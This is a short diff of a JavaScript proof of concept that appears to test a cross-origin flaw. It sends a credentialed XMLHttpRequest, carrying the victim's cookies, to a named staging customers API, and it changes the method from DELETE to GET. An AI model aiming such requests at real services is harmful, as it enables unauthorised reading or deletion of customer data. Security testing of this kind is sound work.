@@ -10,7 +10,7 @@
             // Change this URL to the vulnerable API endpoint
             var url = "https://api.staging.my.zalora.net/v1/customers";
 
-            xhttp.open("DELETE", url, true);
+            xhttp.open("GET", url, true);
             xhttp.withCredentials = true; // Important for sending cookies
 
             xhttp.onload = function () {
